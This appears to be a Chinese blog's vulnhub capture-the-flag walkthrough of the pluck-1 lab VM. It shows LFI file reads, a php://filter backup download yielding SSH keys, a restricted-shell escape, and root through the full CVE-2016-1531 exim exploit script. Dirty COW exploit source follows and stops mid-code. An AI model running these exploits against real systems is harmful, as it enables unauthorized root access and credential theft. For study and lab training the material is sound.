<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/linux-sendpage3<span class="comment"># ls</span></span><br><span class="line">exploit.c  exploit-pulseaudio.c  run  runcon-mmap_zero  sesearch-mmap_zero</span><br><span class="line"></span><br><span class="line">vmware@ubuntuvm:/tmp$ ls</span><br><span class="line">exp      exploit.c           exploit-pulseaudio.c  hello.cgi  runcon-mmap_zero    sqlMAUTWl</span><br><span class="line">exploit  exploit-pulseaudio  exploit.so            run        sesearch-mmap_zero  vmsplice.c</span><br><span class="line">vmware@ubuntuvm:/tmp$ ./run</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),111(lpadmin),112(admin),1000(vmware)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>成功提权！！！帅呆了！！！</p>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[pluck-1]</title>
    <url>/2020/04/08/pluck-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：pluck: 1<br>发布日期：2017年3月11日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>pluck.ova.zip</p>
<ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9wbHVjay9wbHVjay5vdmEuemlw">https://download.vulnhub.com/pluck/pluck.ova.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9wbHVjay9wbHVjay5vdmEuemlwLnRvcnJlbnQ=">https://download.vulnhub.com/pluck/pluck.ova.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>“享受” — @ryanoberto</p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.121</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">MAC Address: 08:00:27:45:29:54 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -p- -v 192.168.56.121</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">5355/tcp open  llmnr?</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -p 22,80,3306,5355 -v 192.168.56.121 -T4 --script=vuln</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.121</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.121:80/admin.php</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: admin.php</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.121:80/index.php?page=contact.php</span><br><span class="line">|     Form id: message</span><br><span class="line">|_    Form action: <span class="comment">#</span></span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">| http-enum: </span></span><br><span class="line"><span class="string">|   /admin.php: Possible admin folder</span></span><br><span class="line"><span class="string">|   /css/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.18 (ubuntu)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /images/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.18 (ubuntu)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|_  /js/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.18 (ubuntu)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">| http-passwd: Directory traversal found.</span></span><br><span class="line"><span class="string">| Payload: &quot;%2F%2Fetc%2Fpasswd&quot;</span></span><br><span class="line"><span class="string">| Printing first 250 bytes:</span></span><br><span class="line"><span class="string">| &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">| &lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">| &lt;head&gt;</span></span><br><span class="line"><span class="string">| &lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">| &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span></span><br><span class="line"><span class="string">| &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span></span><br><span class="line"><span class="string">| &lt;title&gt;Pluck&lt;/title&gt;</span></span><br><span class="line"><span class="string">|_&lt;link rel=&quot;stylesheet&quot; href=&quot;/css/bootstrap</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.4.18 (Ubuntu)</span></span><br><span class="line"><span class="string">| http-slowloris-check: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Slowloris DOS attack</span></span><br><span class="line"><span class="string">|     State: LIKELY VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2007-6750</span></span><br><span class="line"><span class="string">|       Slowloris tries to keep many connections to the target web server open and hold</span></span><br><span class="line"><span class="string">|       them open as long as possible.  It accomplishes this by opening connections to</span></span><br><span class="line"><span class="string">|       the target web server and sending a partial request. By doing so, it starves</span></span><br><span class="line"><span class="string">|       the http server&#x27;</span>s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">|_      http://ha.ckers.org/slowloris/</span><br><span class="line">| http-sql-injection: </span><br><span class="line">|   Possible sqli <span class="keyword">for</span> queries:</span><br><span class="line">|     http://192.168.56.121:80/search?forcedict=resolve%27%20OR%20sqlspider&amp;q=define%2bresolve&amp;ved=0ahUKEwiK9crGrc3RAhXpCsAKHYomC50Q_SoISDAA&amp;sa=X</span><br><span class="line">|     http://192.168.56.121:80/search?forcedict=resolve&amp;q=define%2bresolve%27%20OR%20sqlspider&amp;ved=0ahUKEwiK9crGrc3RAhXpCsAKHYomC50Q_SoISDAA&amp;sa=X</span><br><span class="line">|     http://192.168.56.121:80/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.121:80/js/?C=N%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|   Possible sqli <span class="keyword">for</span> forms:</span><br><span class="line">|     Form at path: /admin.php, form<span class="string">&#x27;s action: admin.php. Fields that might be vulnerable:</span></span><br><span class="line"><span class="string">|_      email</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">5355/tcp open  llmnr?</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br></pre></td></tr></table></figure>

<p>端口80上的网站由PHP驱动，尝试了许多PHP技巧来检查漏洞，并发现该网站容易受到LFI和PHP base64-encode技巧的攻击！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.121/index.php?page=/etc/passwd</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub242.jpg"></li>
</ul>
<p>现在得到了一个用户列表：</p>
<ul>
<li>bob</li>
<li>peter</li>
<li>paul</li>
<li>backup-user</li>
</ul>
<p>确实尝试过暴力破解，SQLi的管理员登录页面，但是运气不太好。</p>
<p>接下来，返回到用户列表，并尝试包含备份用户登录shell中提到的备份脚本。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.121/index.php?page=/usr/<span class="built_in">local</span>/scripts/backup.sh</span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/bash ######################## # Server Backup script # ######################## #Backup directories in /backups so we can get it via tftp echo &quot;Backing up data&quot; tar -cf /backups/backup.tar /home /var/www/html &gt; /dev/null 2&amp; &gt; /dev/null echo &quot;Backup complete&quot; </span></span><br></pre></td></tr></table></figure>

<p>可以尝试包含tar文件，但这将是一团糟！因此，利用PHP base64编码技巧，通过对backup.tar文件的数据进行编码，然后剪切周围的HTML并在本地对其进行解码，来安全地下载文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/pluck-1<span class="comment"># curl http://192.168.56.121/index.php?page=php://filter/convert.base64-encode/resource=/backups/backup.tar | grep &#x27;jumbotron&gt;&#x27; | cut -d &#x27;&gt;&#x27; -f 2 | cut -d &#x27;&lt;&#x27; -f 1 &gt; backup.tar64</span></span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100 2361k    0 2361k    0     0  32.0M      0 --:--:-- --:--:-- --:--:-- 32.0M</span><br><span class="line">root@kali:~/vulnhub/pluck-1<span class="comment"># ls</span></span><br><span class="line">backup.tar64</span><br></pre></td></tr></table></figure>

<p>base64解码生成backup.tar</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/pluck-1<span class="comment"># base64 -d backup.tar64 &gt; backup.tar</span></span><br><span class="line">root@kali:~/vulnhub/pluck-1<span class="comment"># ls</span></span><br><span class="line">backup.tar  backup.tar64</span><br></pre></td></tr></table></figure>

<p>最后进行解压缩操作</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/pluck-1<span class="comment"># mkdir backup ; tar -xvf backup.tar -C backup</span></span><br><span class="line">home/</span><br><span class="line">home/bob/</span><br><span class="line">home/bob/.bashrc</span><br><span class="line">home/bob/.sudo_as_admin_successful</span><br><span class="line">home/bob/.profile</span><br><span class="line">home/bob/.bash_logout</span><br><span class="line">home/paul/</span><br><span class="line">home/paul/keys/</span><br><span class="line">home/paul/keys/id_key3.pub</span><br><span class="line">home/paul/keys/id_key2.pub</span><br><span class="line">home/paul/keys/id_key2</span><br><span class="line">home/paul/keys/id_key4.pub</span><br><span class="line">home/paul/keys/id_key5.pub</span><br><span class="line">home/paul/keys/id_key6</span><br><span class="line">home/paul/keys/id_key1</span><br><span class="line">home/paul/keys/id_key5</span><br><span class="line">home/paul/keys/id_key1.pub</span><br><span class="line">home/paul/keys/id_key6.pub</span><br><span class="line">home/paul/keys/id_key4</span><br><span class="line">home/paul/keys/id_key3</span><br><span class="line">home/paul/.bashrc</span><br><span class="line">home/paul/.profile</span><br><span class="line">home/paul/.bash_logout</span><br><span class="line">home/peter/</span><br><span class="line">home/peter/.bashrc</span><br><span class="line">home/peter/.profile</span><br><span class="line">home/peter/.bash_logout</span><br><span class="line">var/www/html/</span><br><span class="line">var/www/html/fonts/</span><br><span class="line">var/www/html/fonts/glyphicons-halflings-regular.svg</span><br><span class="line">var/www/html/fonts/glyphicons-halflings-regular.woff2</span><br><span class="line">var/www/html/fonts/glyphicons-halflings-regular.ttf</span><br><span class="line">var/www/html/fonts/glyphicons-halflings-regular.woff</span><br><span class="line">var/www/html/fonts/glyphicons-halflings-regular.eot</span><br><span class="line">var/www/html/about.php</span><br><span class="line">var/www/html/index.php</span><br><span class="line">var/www/html/footer.php</span><br><span class="line">var/www/html/css/</span><br><span class="line">var/www/html/css/bootstrap.css.map</span><br><span class="line">var/www/html/css/bootstrap.min.css.map</span><br><span class="line">var/www/html/css/bootstrap-theme.css</span><br><span class="line">var/www/html/css/bootstrap-theme.min.css</span><br><span class="line">var/www/html/css/bootstrap.min.css</span><br><span class="line">var/www/html/css/bootstrap-theme.min.css.map</span><br><span class="line">var/www/html/css/bootstrap-theme.css.map</span><br><span class="line">var/www/html/css/bootstrap.css</span><br><span class="line">var/www/html/header.php</span><br><span class="line">var/www/html/admin.php</span><br><span class="line">var/www/html/js/</span><br><span class="line">var/www/html/js/jquery.min.js</span><br><span class="line">var/www/html/js/bootstrap.js</span><br><span class="line">var/www/html/js/npm.js</span><br><span class="line">var/www/html/js/bootstrap.min.js</span><br><span class="line">root@kali:~/vulnhub/pluck-1<span class="comment"># ls</span></span><br><span class="line">backup  backup.tar  backup.tar64</span><br></pre></td></tr></table></figure>

<p>解压缩文件后，注意到存在包含用户Paul SSH密钥的keys文件夹，将测试这些密钥，直到获得有效的SSH登录密匙</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/pluck-1/backup/home/paul/keys<span class="comment"># ssh paul@192.168.56.121 -i id_key4</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub243.jpg"></li>
</ul>
<p>在这种情况下，看到的是菜单类型的Shell登录，但是可以通过选择Edit file并输入任何文件名来退出该菜单，以开始使用vim。</p>
<p>输入下面的vim命令来设置shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:<span class="built_in">set</span> shell=/bin/bash</span><br></pre></td></tr></table></figure>

<p>然后输入以下内容以跳至Bash shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:shell</span><br></pre></td></tr></table></figure>

<p>成功获取了shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/pluck-1/backup/home/paul/keys<span class="comment"># ssh paul@192.168.56.121 -i id_key4                                      </span></span><br><span class="line">Last login: Thu Apr  9 07:55:00 2020 from 192.168.56.1</span><br><span class="line"></span><br><span class="line">paul@pluck:~$ id</span><br><span class="line">uid=1002(paul) gid=1002(paul) groups=1002(paul)</span><br><span class="line">paul@pluck:~$ whoami</span><br><span class="line">paul</span><br><span class="line">paul@pluck:~$</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub244.jpg"></li>
</ul>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>尝试使用内核漏洞进行提权，但是运气不好，但是在搜索SUID之后，可以注意到exim agent的存在。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">paul@pluck:~$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/exim/bin/exim-4.84-7                                                                                                  </span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/s-nail/s-nail-privsep</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/ntfs-3g</span><br></pre></td></tr></table></figure>

<p>尝试了一些漏洞利用exim代理来提升权限，但不起作用，但是决定尝试一下此漏洞，因为版本差异很小，幸运的是，此漏洞起作用。</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMzk1MzU=">Exim-4.84-3-Local-Privilege-Escalation<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>exploitation</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># CVE-2016-1531 exim &lt;= 4.84-3 local root exploit</span></span><br><span class="line"><span class="comment"># ===============================================</span></span><br><span class="line"><span class="comment"># you can write files as root or force a perl module to</span></span><br><span class="line"><span class="comment"># load by manipulating the perl environment and running</span></span><br><span class="line"><span class="comment"># exim with the &quot;perl_startup&quot; arguement -ps. </span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># e.g.</span></span><br><span class="line"><span class="comment"># [fantastic@localhost tmp]$ ./cve-2016-1531.sh </span></span><br><span class="line"><span class="comment"># [ CVE-2016-1531 local root exploit</span></span><br><span class="line"><span class="comment"># sh-4.3# id</span></span><br><span class="line"><span class="comment"># uid=0(root) gid=1000(fantastic) groups=1000(fantastic)</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># -- Hacker Fantastic </span></span><br><span class="line"><span class="built_in">echo</span> [ CVE-2016-1531 <span class="built_in">local</span> root exploit</span><br><span class="line">cat &gt; /tmp/root.pm &lt;&lt; EOF</span><br><span class="line">package root;</span><br><span class="line">use strict;</span><br><span class="line">use warnings;</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">EOF</span><br><span class="line">PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps</span><br></pre></td></tr></table></figure>

<p>提权过程脚本内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat &gt; /tmp/root.pm &lt;&lt; EOF</span><br><span class="line">package root;</span><br><span class="line">use strict;</span><br><span class="line">use warnings;</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">EOF</span><br><span class="line">PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps</span><br></pre></td></tr></table></figure>

<p>提权，成功获取到了flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aul@pluck:~$ cat &gt; /tmp/root.pm &lt;&lt; EOF</span><br><span class="line">&gt; package root;</span><br><span class="line">&gt; use strict;</span><br><span class="line">&gt; use warnings;</span><br><span class="line">&gt; system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&gt; EOF</span><br><span class="line">paul@pluck:~$ PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=1002(paul) groups=1002(paul)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line"><span class="comment"># cat flag.txt</span></span><br><span class="line"></span><br><span class="line">Congratulations you found the flag</span><br><span class="line"></span><br><span class="line">---------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">######   ((((((((((((((((((((((((((((((</span></span><br><span class="line"><span class="comment">#########   (((((((((((((((((((((((((((</span></span><br><span class="line">,,<span class="comment">##########   ((((((((((((((((((((((((</span></span><br><span class="line">@@,,,<span class="comment">##########   (((((((((((((((((((((</span></span><br><span class="line">@@@@@,,,<span class="comment">##########                     </span></span><br><span class="line">@@@@@@@@,,,<span class="comment">############################</span></span><br><span class="line">@@@@@@@@@@@,,,<span class="comment">#########################</span></span><br><span class="line">@@@@@@@@@,,,<span class="comment">###########################</span></span><br><span class="line">@@@@@@,,,<span class="comment">##########                    </span></span><br><span class="line">@@@,,,<span class="comment">##########   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span></span><br><span class="line">,,,<span class="comment">##########   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span></span><br><span class="line"><span class="comment">##########   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span></span><br><span class="line"><span class="comment">#######   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub245.jpg"></li>
</ul>
<h3 id="提权2"><a href="#提权2" class="headerlink" title="提权2"></a>提权2</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDA4NDc=">Linux内核2.6.22-3.9-Dirty-COW-/proc/self/mem-竞争条件提权-/etc/passwd方法<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>脏牛提权</p>
<p>40847.cpp</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// EDB-Note: Compile:   g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">// EDB-Note: Recommended way to run:   ./dcow -s    (Will automatically <span class="keyword">do</span> <span class="string">&quot;echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs&quot;</span>)</span><br><span class="line">//</span><br><span class="line">// -----------------------------------------------------------------</span><br><span class="line">// Copyright (C) 2016  Gabriele Bonacini</span><br><span class="line">//</span><br><span class="line">// This program is free software; you can redistribute it and/or modify</span><br><span class="line">// it under the terms of the GNU General Public License as published by</span><br><span class="line">// the Free Software Foundation; either version 3 of the License, or</span><br><span class="line">// (at your option) any later version.</span><br><span class="line">// This program is distributed <span class="keyword">in</span> the hope that it will be useful,</span><br><span class="line">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="line">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="line">// GNU General Public License <span class="keyword">for</span> more details.</span><br><span class="line">// You should have received a copy of the GNU General Public License</span><br><span class="line">// along with this program; <span class="keyword">if</span> not, write to the Free Software Foundation,</span><br><span class="line">// Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301  USA</span><br><span class="line">// -----------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fstream&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string&gt;</span></span><br><span class="line"><span class="comment">#include &lt;thread&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;pwd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;pty.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;termios.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/wait.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;signal.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define  BUFFSIZE    1024</span></span><br><span class="line"><span class="comment">#define  PWDFILE     &quot;/etc/passwd&quot;</span></span><br><span class="line"><span class="comment">#define  BAKFILE     &quot;./.ssh_bak&quot;</span></span><br><span class="line"><span class="comment">#define  TMPBAKFILE  &quot;/tmp/.ssh_bak&quot;</span></span><br><span class="line"><span class="comment">#define  PSM         &quot;/proc/self/mem&quot;</span></span><br><span class="line"><span class="comment">#define  ROOTID      &quot;root:&quot;</span></span><br><span class="line"><span class="comment">#define  SSHDID      &quot;sshd:&quot;</span></span><br><span class="line"><span class="comment">#define  MAXITER     300</span></span><br><span class="line"><span class="comment">#define  DEFPWD      &quot;$6$P7xBAooQEZX/ham$9L7U0KJoihNgQakyfOQokDgQWLSTFZGB9LUU7T0W2kH1rtJXTzt9mG4qOoz9Njt.tIklLtLosiaeCBsZm8hND/&quot;</span></span><br><span class="line"><span class="comment">#define  TXTPWD      &quot;dirtyCowFun\n&quot;</span></span><br><span class="line"><span class="comment">#define  DISABLEWB   &quot;echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs\n&quot;</span></span><br><span class="line"><span class="comment">#define  EXITCMD     &quot;exit\n&quot;</span></span><br><span class="line"><span class="comment">#define  CPCMD       &quot;cp &quot;</span></span><br><span class="line"><span class="comment">#define  RMCMD       &quot;rm &quot;</span></span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">class Dcow&#123;</span><br><span class="line">    private:</span><br><span class="line">       bool              run,        rawMode,     opShell,   restPwd;</span><br><span class="line">       void              *map;</span><br><span class="line">       int               fd,         iter,        master,    wstat;</span><br><span class="line">       string            buffer,     etcPwd,      etcPwdBak,</span><br><span class="line">                         root,       user,        <span class="built_in">pwd</span>,       sshd;</span><br><span class="line">       thread            *writerThr, *madviseThr, *checkerThr;</span><br><span class="line">       ifstream          *extPwd;</span><br><span class="line">       ofstream          *extPwdBak;</span><br><span class="line">       struct passwd     *userId;</span><br><span class="line">       pid_t             child;  </span><br><span class="line">       char              buffv[BUFFSIZE];</span><br><span class="line">       fd_set            rfds;</span><br><span class="line">       struct termios    termOld,    termNew;</span><br><span class="line">       ssize_t           ign;</span><br><span class="line"></span><br><span class="line">       void exitOnError(string msg);</span><br><span class="line">    public:</span><br><span class="line">       Dcow(bool opSh, bool rstPwd);</span><br><span class="line">       ~Dcow(void);</span><br><span class="line">       int  expl(void);         </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Dcow::Dcow(bool opSh, bool rstPwd) : run(<span class="literal">true</span>), rawMode(<span class="literal">false</span>), opShell(opSh), restPwd(rstPwd),</span><br><span class="line">                   iter(0), wstat(0), root(ROOTID), <span class="built_in">pwd</span>(DEFPWD), sshd(SSHDID), writerThr(nullptr),</span><br><span class="line">                   madviseThr(nullptr), checkerThr(nullptr), extPwd(nullptr), extPwdBak(nullptr), </span><br><span class="line">                   child(0)&#123; </span><br><span class="line">   userId = getpwuid(getuid());</span><br><span class="line">   user.append(userId-&gt;pw_name).append(<span class="string">&quot;:&quot;</span>);</span><br><span class="line">   extPwd = new ifstream(PWDFILE);   </span><br><span class="line">   <span class="keyword">while</span> (getline(*extPwd, buffer))&#123;</span><br><span class="line">       buffer.append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">       etcPwdBak.append(buffer);</span><br><span class="line">       <span class="keyword">if</span>(buffer.find(root) == 0)&#123;</span><br><span class="line">          etcPwd.insert(0, root).insert(root.size(), <span class="built_in">pwd</span>);</span><br><span class="line">          etcPwd.insert(etcPwd.begin() + root.size() + pwd.size(), </span><br><span class="line">                        buffer.begin() + buffer.find(<span class="string">&quot;:&quot;</span>, root.size()), buffer.end());</span><br><span class="line">       &#125;<span class="keyword">else</span> <span class="keyword">if</span>(buffer.find(user) == 0 ||  buffer.find(sshd) == 0 )&#123;</span><br><span class="line">          etcPwd.insert(0, buffer);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          etcPwd.append(buffer);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   extPwdBak = new ofstream(restPwd ? TMPBAKFILE : BAKFILE);</span><br><span class="line">   extPwdBak-&gt;write(etcPwdBak.c_str(), etcPwdBak.size());</span><br><span class="line">   extPwdBak-&gt;close();</span><br><span class="line">   fd = open(PWDFILE,O_RDONLY);</span><br><span class="line">   map = mmap(nullptr, etcPwdBak.size(), PROT_READ,MAP_PRIVATE, fd, 0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Dcow::~Dcow(void)&#123;</span><br><span class="line">   extPwd-&gt;close();</span><br><span class="line">   close(fd);</span><br><span 